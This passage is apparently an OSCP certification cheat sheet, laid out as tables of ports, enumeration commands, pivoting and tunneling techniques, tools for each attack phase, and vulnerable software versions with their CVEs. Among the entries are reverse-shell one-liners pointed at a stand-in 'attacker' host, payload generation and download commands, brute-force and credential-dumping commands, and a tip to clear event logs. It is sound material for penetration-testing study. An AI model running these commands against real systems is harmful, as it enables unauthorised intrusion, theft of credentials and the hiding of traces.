| *23   | TCP      | Telnet      | Plain-text credentials, banner info                      | `nmap --script telnet-encryption,telnet-ntlm-info -p23 <IP>` <br> `telnet <IP>` |
| *25   | TCP      | SMTP        | User enum, phishing, open relay                          | `nmap --script smtp-enum-users,smtp-commands -p25 <IP>` <br> `smtp-user-enum -U /usr/share/wordlists/users.txt -t <IP>` |
| *53   | TCP/UDP  | DNS         | Zone transfers, DNS enumeration                          | `dig @<IP> axfr domain.com` <br> `dnsrecon -d domain.com -t axfr` |
| *80   | TCP      | HTTP        | Web apps (SQLi, LFI/RFI, RCE), Gobuster, Nikto           | `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt` <br> `nikto -h http://<IP>` |
| 88    | TCP      | Kerberos    | AS-REP roasting, Kerberoasting (Active Directory)        | `GetNPUsers.py domain/user -dc-ip <IP>` <br> `GetUserSPNs.py domain/user:pass -dc-ip <IP>` |
| *110  | TCP      | POP3        | Weak creds, cleartext creds                              | `nmap --script pop3-capabilities,pop3-ntlm-info -p110 <IP>` <br> `telnet <IP> 110` |
| 111   | TCP/UDP  | RPCBind     | NFS, remote procedure enumeration                        | `nmap -sV --script=rpcinfo -p111 <IP>` |
| *135  | TCP      | MS RPC      | Lateral movement, DCOM exploitation                      | `nmap -sV -p135 --script=msrpc-enum <IP>` |
| *139  | TCP      | NetBIOS     | SMB enumeration, shares                                  | `enum4linux -a <IP>` <br> `nmap --script nbstat -p139 <IP>` |
| 143   | TCP      | IMAP        | Cleartext creds, mailbox enum                            | `nmap --script imap-capabilities,imap-ntlm-info -p143 <IP>` |
| 161   | UDP      | SNMP        | Public community strings, SNMPwalk                       | `snmpwalk -v2c -c public <IP>` |
| *389  | TCP/UDP  | LDAP        | AD enum, user/group info                                 | `ldapsearch -x -H ldap://<IP> -s base namingcontexts` <br> `nmap --script ldap* -p389 <IP>` |
| *445  | TCP      | SMB         | EternalBlue, shares, null sessions, LPE                  | `enum4linux -a <IP>` <br> `smbclient -L //<IP>/ -N` <br> `crackmapexec smb <IP>` |
| 512   | TCP      | RSH         | Remote shell, legacy service                             | `rsh <IP> -l root` |
| 513   | TCP      | RLogin      | Legacy login service                                     | `rlogin <IP>` |
| 587   | TCP      | SMTP (Submission) | Authenticated email sending                        | `nmap --script smtp-commands -p587 <IP>` |
| 1433  | TCP      | MSSQL       | Weak creds, xp_cmdshell abuse                            | `nmap --script ms-sql-info,ms-sql-empty-password -p1433 <IP>` <br> `sqsh -S <IP> -U sa -P password` |
| 5985  | TCP      | WinRM       | Remote PowerShell execution                              | `evil-winrm -i <IP> -u user -p pass` |
| *3306 | TCP      | MySQL       | SQLi, default creds, privilege escalation                | `nmap --script mysql* -p3306 <IP>` <br> `mysql -h <IP> -u root -p` |
| *3389 | TCP      | RDP         | Weak creds                                               | `nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p3389 <IP>` <br> `xfreerdp /u:user /p:pass /v:<IP>` |
| 5432  | TCP      | PostgreSQL  | SQLi, privilege escalation                               | `psql -h <IP> -U postgres` |
| *5900 | TCP      | VNC         | Misconfig, no password, weak creds                       | `nmap --script vnc-info,vnc-title -p5900 <IP>` <br> `vncviewer <IP>` |
| 8000  | TCP      | HTTP-alt    | Python web server, custom services                       | `curl http://<IP>:8000` <br> `gobuster dir -u http://<IP>:8000 -w /usr/share/wordlists/dirb/common.txt` |
| *8080 | TCP      | Web Proxies | Tomcat, Jenkins, apps on alt ports                       | `nmap --script http-enum -p8080 <IP>` <br> `curl http://<IP>:8080` |
| *8443 | TCP      | HTTPS-alt   | Web services over TLS                                    | `nmap --script ssl-cert,ssl-enum-ciphers -p8443 <IP>` |
| 8888  | TCP      | Web Apps    | Jupyter, Flask, dev interfaces                           | `curl http://<IP>:8888` <br> `gobuster dir -u http://<IP>:8888 -w /usr/share/wordlists/dirb/common.txt` |

# Port tunneling and port redirection 
<img src="https://github.com/xasyhack/oscp2025/blob/main/images/port%20forward%20and%20tunneling.png" alt="" width="400"/>  

**Option 1: Port Redirection using socat (Simple)**  
Pivot machine A: socat TCP-LISTEN:8888,fork TCP:172.16.10.10:80  
Kali: curl http://10.10.10.5:8888  

**Option 2: SSH Tunneling - Local Forwarding (if SSH access on A)**  
kali: ssh -L 8888:172.16.10.10:80 user@10.10.10.5  
kali: curl http://localhost:8888  

**Option 3: Dynamic Proxy via SSH (SOCKS5)**  
kali: ssh -D 9050 user@10.10.10.5  
Edit /etc/proxychains.conf: socks5  127.0.0.1 9050  
kali: proxychains nmap -Pn -sT -p80 172.16.10.10  

| **Concept**                      | **You Want To...**                              | **Scenario**                                                                 | **Technique**                | **Command Example**                                                                                                                                       | **Notes**                                                                                  |
|----------------------------------|--------------------------------------------------|------------------------------------------------------------------------------|------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------|
| **Port Redirection using socat** | Access internal RDP/web from pivot host         | You compromised `10.10.10.5`, want to reach `172.16.5.10:3389` (RDP)         | socat TCP Port Forward       | `socat TCP-LISTEN:3389,fork TCP:172.16.5.10:3389` *(on pivot)*<br>`rdesktop 10.10.10.5:3389` *(on Kali)*                                                  | No encryption; simple TCP relay                                                            |
| **SSH Local Port Forwarding**    | Access internal web via tunnel                  | You have SSH on `10.10.10.5`, want to view `172.16.5.10:80`                  | `ssh -L` (local forward)     | `ssh -L 8888:172.16.5.10:80 user@10.10.10.5`<br>`curl http://localhost:8888` *(on Kali)*                                                                   | Great for web/DB services                                                                 |
| **SSH Remote Port Forwarding**   | Let victim connect back to you                 | Firewall blocks reverse shell directly, but allows SSH outbound              | `ssh -R` (reverse tunnel)    | `ssh -R 4444:localhost:4444 kali@your.kali.ip` *(on pivot)*<br>`nc -lvnp 4444` *(on Kali)*                                                                 | Good for shells from behind firewalls                                                      |
| **SSH Dynamic Proxy**            | Proxy tools through pivot host                 | You want to scan or browse internal network via `10.10.10.5`                | `ssh -D` (SOCKS5 Proxy)      | `ssh -D 9050 user@10.10.10.5` *(on Kali)*<br>Set `proxychains.conf`: `socks5 127.0.0.1 9050`<br>`proxychains nmap -Pn -sT 172.16.5.10`                    | Enables `proxychains`, Gobuster, browsers                                                  |
| **Chisel (Reverse Tunnel)**      | Pivot without SSH, e.g., Windows box           | Compromised host runs Chisel reverse client to you                          | Chisel SOCKS over reverse    | `chisel server -p 8000 --reverse` *(on Kali)*<br>`chisel client yourip:8000 R:1080:socks` *(on pivot)*                                                    | Useful on Windows without SSH                                                              |
| **iptables NAT (Linux pivot)**   | Route traffic via Linux box without tools      | You have root on a Linux pivot with `iptables`                              | Linux NAT Port Forward       | `iptables -t nat -A PREROUTING -p tcp --dport 3333 -j DNAT --to-destination 172.16.5.10:80` *(on pivot)*<br>`curl http://10.10.10.5:3333` *(on Kali)*     | Native but less flexible; requires root                                                    |

| **Step** | **Action**                          | **Command**                                                                                      | **Run on**        |
|----------|--------------------------------------|--------------------------------------------------------------------------------------------------|-------------------|
| 1        | Prepare Chisel binaries              | `wget ... && gunzip ... && chmod +x ...` (see full commands below)                              | Kali              |
| 2        | Start HTTP server to serve files     | `python3 -m http.server 80`                                                                      | Kali              |
| 3        | Download Chisel binary               | `wget http://<kali-ip>/chisel.elf` or PowerShell `Invoke-WebRequest`                            | Victim            |
| 4        | Start Chisel server (reverse mode)   | `./chisel.elf server -p 8000 --reverse`                                                          | Kali              |
| 5        | Start Chisel client (reverse tunnel) | `./chisel.elf client <kali-ip>:8000 R:1080:socks` <br> or `chisel.exe ...`                      | Victim            |
| 6        | Configure proxychains                 | Add `socks5 127.0.0.1 1080` in `/etc/proxychains.conf`                                           | Kali              |
| 7        | Use proxychains to access internal   | `proxychains nmap -Pn -sT -p80 172.16.10.10` <br> `proxychains curl http://172.16.10.10`         | Kali              |

# OSCP Pro Tips
| Tip Category       | Tip |
|--------------------|-----|
| **General Strategy** | Start with **AutoRecon or manual Nmap**, then branch into web (Gobuster/Feroxbuster), SMB (CME/Impacket), or known services. |
| **Time Management** | Spend no more than 1 hour per box if you're stuck. Move on and return later. |
| **Initial Foothold** | Look for unauthenticated pages, exposed SMB/NFS shares, backup files (`.bak`, `.zip`), default creds. |
| **Passwords** | Try **rockyou.txt** and known weak creds. Look for reused passwords across services. |
| **Linux Privesc** | Run `linpeas.sh`, check for SUID binaries, writable `/etc/passwd`, crontabs, misconfigured services. |
| **Windows Privesc** | Use `winPEAS`, `whoami /priv`, and check for AlwaysInstallElevated, weak folder permissions, unquoted service paths. |
| **Reverse Shell Tips** | Use `ncat`, `msfvenom`, or `bash -i >& /dev/tcp` variants. Have multiple listeners ready (4444, 5555). |
| **Pivoting** | Use **Chisel** or **SSH tunnels** to reach internal networks. Don’t overlook second-level escalation. |
| **Reporting** | Take screenshots of each flag, privilege escalation step, and exploit. Label clearly. |
| **Persistence** | If you lose shell, try to re-exploit quickly. Always upload a reverse shell backup (`nc.exe`, `bash shell`, etc.). |
| **VPN Stability** | If VPN disconnects, your *target machines will reset*. Save all notes **locally** in case of resets. |
| **Proof Files** | Submit `proof.txt` and `local.txt` for each rooted box. These are essential for point calculation. |
| **Mental Game** | Stay calm. 3 roots + 1 user = pass. Don’t panic over one tough box. Maximize your strengths. |

## 🟡 1. Information Gathering / Recon
| Tool            | Purpose                                | Sample Command |
|-----------------|----------------------------------------|----------------|
| `nmap`          | Port scanning, service/version detect  | `nmap -sC -sV -oN scan.txt 10.10.10.10` |
| `AutoRecon`     | Automated recon pipeline               | `autorecon 10.10.10.10` |
| `whatweb`       | Detect web technologies                | `whatweb http://target` |
| `gobuster`      | Web dir brute-force                    | `gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt` |
| `feroxbuster`   | Recursive web discovery                | `feroxbuster -u http://target -w wordlist.txt` |
| `ffuf`          | Web fuzzing                            | `ffuf -u http://target/FUZZ -w wordlist.txt` |
| `nikto`         | Web vulnerability scanner              | `nikto -h http://target` |
| `whatweb`       | Identify web frameworks                 | `whatweb http://target` |
| `theHarvester`  | Email, domain, subdomain harvesting    | `theharvester -d target.com -b google` |
| `amass`         | Subdomain enumeration                  | `amass enum -d target.com` |

## 🔵 2. Enumeration
| Tool             | Purpose                                 | Sample Command |
|------------------|-----------------------------------------|----------------|
| `enum4linux-ng`  | Enumerate Windows shares, users         | `enum4linux-ng -A 10.10.10.10` |
| `crackmapexec`   | SMB, RDP, WinRM share/user checks       | `cme smb 10.10.10.10 -u user -p pass` |
| `smbclient`      | Access SMB shares                       | `smbclient //10.10.10.10/share` |
| `ldapsearch`     | Query LDAP directory                    | `ldapsearch -x -h 10.10.10.10 -b "dc=example,dc=com"` |
| `snmpwalk`       | SNMP device enumeration                 | `snmpwalk -v2c -c public 10.10.10.10` |
| `sqlmap`         | Automated SQLi and DB dump              | `sqlmap -u "http://target?id=1" --dbs` |
| `wfuzz`          | Web fuzzing                             | `wfuzz -c -z file,wordlist.txt --hc 404 http://target/FUZZ` |
| `impacket-samrdump` | SAMR info enumeration                | `samrdump.py 10.10.10.10` |

## 🟢 3. Gaining Access (Exploitation)

| Tool           | Purpose                                  | Sample Command |
|----------------|------------------------------------------|----------------|
| `msfvenom`     | Payload generation                        | `msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe > shell.exe` |
| `Metasploit`   | Framework for exploitation                | `msfconsole → use exploit/multi/handler` |
| `ncat`         | Reverse shell handling                    | `ncat -lvnp 4444` |
| `python`       | Simple webserver                          | `python3 -m http.server 80` |
| `wget` / `curl`| File retrieval                            | `wget http://attacker/shell.sh` |
| `searchsploit` | Local exploit database search             | `searchsploit apache 2.4` |
| `nishang`      | PowerShell payloads                       | Import scripts for Windows shells |

## 🟠 4. Privilege Escalation
| Tool             | Purpose                                | Sample Command |
|------------------|----------------------------------------|----------------|
| `linpeas.sh`     | Linux privesc script                    | `./linpeas.sh` |
| `winPEAS.exe`    | Windows privesc script                  | `winPEASx64.exe` |
| `sudo -l`        | List sudo privileges                    | `sudo -l` |
| `pspy`           | Monitor Linux processes                 | `./pspy64` |
| `linux-exploit-suggester.sh` | Kernel exploit suggestions | `./linux-exploit-suggester.sh` |
| `windows-exploit-suggester.py` | Windows patch-based escalation | `python windows-exploit-suggester.py` |
| `mimikatz`       | Credential dumping on Windows           | `sekurlsa::logonpasswords` |

## 🔴 5. Post-Exploitation / Lateral Movement
| Tool             | Purpose                                | Sample Command |
|------------------|----------------------------------------|----------------|
| `wmiexec.py`     | Remote command execution via WMI       | `wmiexec.py user:pass@target` |
| `psexec.py`      | Run commands via SMB                   | `psexec.py user:pass@target` |
| `secretsdump.py` | Dump Windows hashes                    | `secretsdump.py user:pass@target` |
| `chisel`         | TCP tunneling / pivoting               | `chisel client attacker:9001 R:127.0.0.1:3389` |
| `responder`      | LLMNR poisoning                        | `responder -I eth0` |
| `BloodHound`     | AD enumeration via neo4j               | Use with `SharpHound` collector |

## 🟣 6. Reporting & Cleanup
| Tool              | Purpose                               | Sample Command |
|-------------------|---------------------------------------|----------------|
| `asciinema`       | Terminal session recording            | `asciinema rec` |
| `screenshot tools`| Capture flags / proof steps           | Manual or `gnome-screenshot` |
| `cherrytree`      | Reporting and note keeping            | GUI |
| `keepnote`        | Note organization                     | GUI |
| `rm`, `Clear-EventLog` | Clean traces (if allowed)        | Manual cleanup |

# Kali built in wordlist and payloads
- Password wordlists
  - ❗`/usr/share/wordlists/rockyou.txt`
  - /usr/share/wordlists/test_small_credentials.txt
  - /usr/share/wordlists/fasttrack.txt  
- Gobuster directory wordlists
  - ❗`/usr/share/wordlists/dirb/common.txt`
  - /usr/share/wordlists/dirb/big.txt
  - /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
  - /usr/share/wfuzz/wordlist/general/megabeast.txt
  - /usr/share/wordlists/dirb/others/names.txt    
- hashcat
  - ❗`/usr/share/hashcat/rules/best64.rule`
  - /usr/share/hashcat/rules/rockyou-30000.rule
- webshells
  - ❗`/usr/share/webshells/php/simple-backdoor.php`
  - /usr/share/webshells/aspx/cmdasp.aspx
- post-exploitation/privilege escalation
  - /usr/share/peass/winpeas/winPEASx64.exe
  - /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
  - /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1  
- windows binaries/utilities
  - /usr/share/windows-resources/binaries/nc.exe  
  - /usr/share/windows-resources/binaries/plink.exe  
- nmap: /usr/share/nmap/scripts/*.nse
- exploits
   - /usr/share/exploitdb/exploits/linux/local/45010.c

# OSCP Vulnerable Software Versions
**Remote Exploits / Service Exploits**
| Software          | Vulnerable Version(s) | Exploit / CVE                           |
|------------------|------------------------|-----------------------------------------|
| Apache HTTP Server     | 2.4.49           | CVE-2021-41773 (Path Traversal & Remote Code Execution (RCE))         |
| Apache Tomcat    | 7.x < 7.0.81           | CVE-2017-12615 (PUT upload RCE)         |
| vsftpd           | 2.3.4                  | Backdoor RCE                            |
| Exim             | < 4.89                 | CVE-2019-10149 (Command Injection)      |
| ProFTPD          | 1.3.5                  | CVE-2015-3306 (mod_copy RCE)            |
| MySQL            | 5.5.5 (config issue)   | CVE-2012-2122 (Auth bypass)             |
| Apache httpd     | 2.2.x, 2.4.x (old)     | mod_ssl, mod_cgi RCEs                   |
| PHP              | < 5.6.x, < 7.1.x       | Unserialize RCE                         |
| Drupal           | 7.x / 8.x              | CVE-2018-7600 (Drupalgeddon 2)          |
| Jenkins          | 1.x / 2.x              | Script console RCE                      |
| Nagios XI        | Various                | Command Injection                       |
| Webmin           | 1.910                  | CVE-2019-15107 (Password change RCE)    |
| OpenSSH          | 7.2p2, 5.x             | CVE-2016-0777 (Key leak)                |
| Samba            | 3.x / 4.5.x            | CVE-2017-7494 (Writable share RCE)      |
| Django           | ≤ 1.2.1                | Template injection RCE                  |
| Windows SMB      | Win 7 / Server 2008    | CVE-2017-0144 (EternalBlue)             |
| FTP (anonymous)  | Misconfigured          | Upload shell access                     |
| WordPress        | ≤ 4.7.0                | REST API content injection              |
| phpMyAdmin       | ≤ 4.8.x                | Auth bypass / LFI                       |
| Elasticsearch    | < 1.6                  | CVE-2015-1427 (Groovy script RCE)       |
| DotNetNuke (DNN) | < 9.2                  | CVE-2017-9822 (Install RCE)             |

**Local Privilege Escalation**
| OS / Software     | Vulnerable Version(s) | Exploit / CVE                       |
|------------------|------------------------|-------------------------------------|
| Linux Kernel      | 2.6.32 – 4.4.x         | CVE-2016-5195 (DirtyCow)            |
| Linux Kernel      | ≤ 4.15                 | OverlayFS (Ubuntu)                 |
| Linux Kernel      | 2.6.37 – 5.x           | CVE-2022-0847 (DirtyPipe)           |
| Polkit (pkexec)   | ≤ 0.105                | CVE-2021-4034 (PwnKit)              |
| Sudo              | ≤ 1.8.25p1             | CVE-2019-14287 (Bypass)             |
| Cron              | Misconfigured          | PATH hijacking                      |
| /etc/passwd       | Writable               | Root shell via user change          |
| MySQL             | Running as root        | UDF-based privesc                   |
| NFS               | no_root_squash         | Root shell via mount                |
| Cron + writable   | Root cron job          | Privesc via script injection        |
| Windows: AlwaysInstallElevated | Enabled   | SYSTEM shell via .msi               |
| Windows: Service Path | Unquoted path      | Binary replacement                  |
| Windows: Weak perms| Modifiable service    | Replace exe                         |
| Windows: Token abuse | SeImpersonate enabled| Juicy Potato / Rogue Potato         |
| Windows: UAC bypass| Win 7 / 10            | fodhelper / sdclt                   |
| Windows: DLL Hijack| Misconfigured service | Load custom DLL as SYSTEM           |

**Sample SearchSploit Usage**
searchsploit vsftpd 2.3.4
searchsploit samba 3.0
searchsploit tomcat 7.0.81
searchsploit linux kernel 4.15

# Protocols login
| Protocol        | Port    | Tool                | Kali 2025 Login Command Example                                                                                      |
|-----------------|---------|---------------------|----------------------------------------------------------------------------------------------------------------------|
| **SSH**         | 22      | `ssh`               | `ssh user@10.10.10.10`                                                                                                |
|                 |         | `hydra`             | `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10`                                               |
| **FTP**         | 21      | `ftp`               | `ftp 10.10.10.10`                                                                                                    |
|                 |         | `hydra`             | `hydra -l anonymous -p '' ftp://10.10.10.10`                                                                         |
| **Telnet**      | 23      | `telnet`            | `telnet 10.10.10.10`                                                                                                 |
|                 |         | `hydra`             | `hydra -l root -P /usr/share/wordlists/rockyou.txt telnet://10.10.10.10`                                              |
| **HTTP(S)**     | 80/443  | `hydra`             | `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Incorrect"` |
| **SMB**         | 445     | `smbclient`         | `smbclient -L //10.10.10.10 -U user%password`                                                                         |
|                 |         | `smbmap`            | `smbmap -H 10.10.10.10 -u user -p password`                                                                           |
|                 |         | `crackmapexec`      | `crackmapexec smb 10.10.10.10 -u user -p password`                                                                    |
| **RDP**         | 3389    | `xfreerdp`          | `xfreerdp3 /v:10.10.10.10 /u:user /p:Pass123 /cert-ignore`                                                             |
|                 |         |                     | `xfreerdp3 /v:10.10.10.10 /u:user /pth:0123456789ABCDEF0123456789ABCDEF /cert-ignore`                                  |
| **WinRM**       | 5985    | `evil-winrm`        | `evil-winrm -i 10.10.10.10 -u Administrator -p Pass123`                                                               |
|                 |         |                     | `evil-winrm -i 10.10.10.10 -u Administrator -H AABBCCDDEEFF00112233445566778899`                                        |
|                 |         |                     | `evil-winrm -i 10.10.10.10 -u Administrator -p Pass123 -S`  (SSL mode)                                                 |
| **MySQL**       | 3306    | `mysql`             | `mysql -h 10.10.10.10 -u root -p`                                                                                      |
| **PostgreSQL**  | 5432    | `psql`              | `psql -h 10.10.10.10 -U postgres`                                                                                      |
| **MSSQL**       | 1433    | `impacket-mssqlclient.py` | `mssqlclient.py user@10.10.10.10 -windows-auth`                                                                    |
|                 |         |                     | `mssqlclient.py user@10.10.10.10 -windows-auth -hashes :<NTLM_HASH>`                                                   |
| **VNC**         | 5900    | `vncviewer`         | `vncviewer 10.10.10.10:5900`                                                                                           |
|                 |         | `hydra`             | `hydra -P /usr/share/wordlists/rockyou.txt -t 4 vnc://10.10.10.10`                                                    |
| **POP3**        | 110     | `hydra`             | `hydra -l user -P /usr/share/wordlists/rockyou.txt pop3://10.10.10.10`                                                 |
| **IMAP**        | 143     | `hydra`             | `hydra -l user -P /usr/share/wordlists/rockyou.txt imap://10.10.10.10`                                                 |
| **LDAP**        | 389     | `ldapsearch`        | `ldapsearch -x -h 10.10.10.10 -b "dc=example,dc=local"`                                                                |
| **SNMP**        | 161     | `snmpwalk`          | `snmpwalk -v2c -c public 10.10.10.10`                                                                                   |
| **NFS**         | 2049    | `showmount`         | `showmount -e 10.10.10.10`                                                                                             |
|                 |         | `mount`             | `mount -t nfs 10.10.10.10:/share /mnt`                                                                                 |

# Attack Vectors
| Category               | Attack Vector / Tool                             | Description / Use Case                         |
|------------------------|------------------------------------------------|-----------------------------------------------|
| **Host Discovery**     | `ping`, `fping`, `arp-scan`, `nmap -sn`        | Identify live hosts on network                 |
| **Port Scanning**      | `nmap -sS -sV -p-`, `rustscan`, `masscan`      | Discover open ports and running services       |
| **Service Enumeration**| `enum4linux`, `smbclient`, `smbmap`, `ldapsearch`, `rpcclient`, `snmpwalk`, `nikto`, `wpscan`, `gobuster`, `feroxbuster` | Enumerate SMB, LDAP, SNMP, HTTP services and web content |
| **Web Exploitation**   | SQL Injection (`sqlmap`), LFI/RFI, Command Injection, File Upload Bypass | Exploit web application vulnerabilities        |
| **Common Service Exploits** | FTP (anonymous login), SMB (EternalBlue), MSSQL/MySQL (xp_cmdshell, UDF), Redis (unauthenticated write), RDP (bruteforce) | Service-specific exploitation techniques        |
| **Tunneling & Pivoting**| SSH tunneling (`ssh -L/-R/-D`), tools like `chisel`, `ligolo`, `socat`, proxychains | Bypass network restrictions, access internal hosts |
| **Priv Esc (Linux)**   | `sudo -l`, SUID binaries, kernel exploits (Dirty COW, Dirty Pipe), writable cron/systemd | Escalate privileges on Linux systems            |
| **Priv Esc (Windows)** | AlwaysInstallElevated, Unquoted service paths, weak service perms, token impersonation (JuicyPotato) | Windows privilege escalation techniques          |
| **Credential Hunting** | Extract hashes from `/etc/shadow`, SAM; check bash history, config files | Find credentials for lateral movement or privilege escalation |

1. Host Discovery
- `ping`, `fping`, `arp-scan`
- `nmap -sn`

2. Port Scanning
- `nmap -sS -sV -p-`
- `rustscan`, `masscan`

3. Service Enumeration
- SMB: `enum4linux`, `smbclient`, `smbmap`, `crackmapexec`
- LDAP: `ldapsearch`, `ldapenum`
- SNMP: `snmpwalk`
- RPC: `rpcclient`
- HTTP/Web: `nikto`, `whatweb`, `wpscan`, `gobuster`, `feroxbuster`

4. Web Exploitation
- SQL Injection (Error, Blind, Time-based): `sqlmap`, manual payloads
- LFI/RFI and Path Traversal
- Command Injection
- File Upload Vulnerabilities
- CSRF, XSS (less common for OSCP)

5. Common Service Exploits
- FTP: anonymous login, weak creds
- SMB: EternalBlue, weak shares
- MSSQL/MySQL: xp_cmdshell, UDF uploads
- Redis: unauthenticated write
- RDP: brute-force with `hydra`, `ncrack`

6. Tunneling and Pivoting
- SSH tunneling: `ssh -L`, `-R`, `-D`
- Tools: `chisel`, `ligolo`, `socat`
- Proxychains setup and usage

7. Privilege Escalation (Linux)
- `sudo -l`
- SUID binaries
- Kernel exploits (e.g., Dirty COW, Dirty Pipe)
- Writable cron jobs / systemd services

8. Privilege Escalation (Windows)
- AlwaysInstallElevated policy
- Unquoted service paths
- Weak service permissions
- Token impersonation exploits (JuicyPotato, RottenPotato, etc.)

9. Credential Hunting
- `/etc/passwd`, `/etc/shadow`, SAM
- History files and config files
- Scripts or backups with credentials

# Cracking Tools
| Tool              | Purpose                                  | Sample Command | Info / Output |
|------------------|------------------------------------------|----------------|----------------|
| **nmap**          | Port scan, service/version detection      | `nmap -sC -sV -oN scan.txt 10.10.10.10` | Shows open ports, services, versions, default scripts |
| **AutoRecon**     | Automated enumeration pipeline            | `autorecon 10.10.10.10` | Organizes scans, runs Nmap, Gobuster, LinPEAS automatically |
| **Gobuster**      | Web directory brute-force                 | `gobuster dir -u http://target -w common.txt` | Lists hidden directories or files |
| **Feroxbuster**   | Recursive web content discovery           | `feroxbuster -u http://target -w wordlist.txt` | Recursively finds directories/files |
| **FFUF**          | Fast web fuzzing                          | `ffuf -u http://target/FUZZ -w wordlist.txt` | Reveals valid endpoints via response codes |
| **WFuzz**         | Web input fuzzing                         | `wfuzz -c -z file,rockyou.txt --hc 404 http://target/FUZZ` | Discovers fuzzable parameters, paths |
| **Nikto**         | Web server vulnerability scanner          | `nikto -h http://target` | Lists known issues in web server setup |
| **Burp Suite**    | Manual/intercept web testing              | GUI Tool       | Captures/fuzzes requests, intercepts traffic |
| **Hydra**         | Brute-force remote logins                 | `hydra -l admin -P rockyou.txt ssh://10.10.10.10` | Cracks login credentials |
| **John the Ripper** | Offline hash cracking                   | `john hash.txt --wordlist=rockyou.txt` | Cracked hash output |
| **Hashcat**       | GPU-based hash cracking                   | `hashcat -m 1000 hash.txt rockyou.txt` | Fast crack of NTLM or other hashes |
| **wget**          | Download files                            | `wget http://10.10.10.10/file.sh` | Saves remote file locally |
| **curl**          | File transfer / request testing           | `curl -O http://10.10.10.10/file.sh` | Displays or downloads response |
| **ncat** (netcat) | File transfer, bind/reverse shell         | `ncat -lvnp 4444` / `ncat -e /bin/bash attacker 4444` | Listener or shell |
| **ssh**           | Remote login via SSH                      | `ssh user@10.10.10.10` | Secure shell access |
| **python**        | Simple webserver, reverse shell, etc.     | `python3 -m http.server` or `python -c 'reverse shell'` | Serve payloads or pop shells |
| **Impacket**      | Remote access tools (SMB/RPC)             | `wmiexec.py user:pass@10.10.10.10` | Remote shell, file transfer, SID enumeration |
| **CrackMapExec**  | SMB tool + post-exploitation              | `cme smb 10.10.10.10 -u user -p pass` | Check share access, dump hashes, validate creds |
| **Responder**     | LLMNR/NetBIOS poisoning                   | `responder -I eth0` | Captures NTLMv2 hashes |
| **LinPEAS**       | Linux privilege escalation script         | `./linpeas.sh` | Highlights privesc vectors in color |
| **WinPEAS**       | Windows privilege escalation script       | `winPEASx64.exe` | Checks for service misconfigs, ACLs, registry abuse |
| **Chisel**        | Tunneling over HTTP                       | `chisel server -p 9001` / `chisel client attacker:9001 R:localhost:3389` | Pivoting, port forwarding |
| **Mimikatz**      | Credential dumping (Windows)              | `privilege::debug`, `sekurlsa::logonpasswords` | Reveals passwords, hashes, tickets |
| **msfvenom**      | Payload generation                        | `msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe` | Generates reverse shell binaries |
| **Metasploit**    | Exploits + post modules                   | `msfconsole` → use exploits | Interactive exploit framework with session management |


